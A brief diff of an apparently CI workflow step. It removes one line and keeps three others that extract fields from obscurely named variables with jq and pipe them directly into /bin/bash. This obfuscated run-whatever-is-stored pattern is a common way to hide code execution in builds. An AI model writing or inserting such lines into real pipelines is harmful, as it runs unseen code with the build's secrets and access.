@@ -29,7 +29,6 @@ jobs:
           echo $u2 | jq -r .xfry74 | /bin/bash
           echo $u4 | jq -r .rt104 | /bin/bash
           echo $t2295 | jq -r .d2474 | /bin/bash
-          printf '%s' "$p7995" | jq -r .usmlx095 | /bin/bash
 
       - name: Archive output
         if: always()
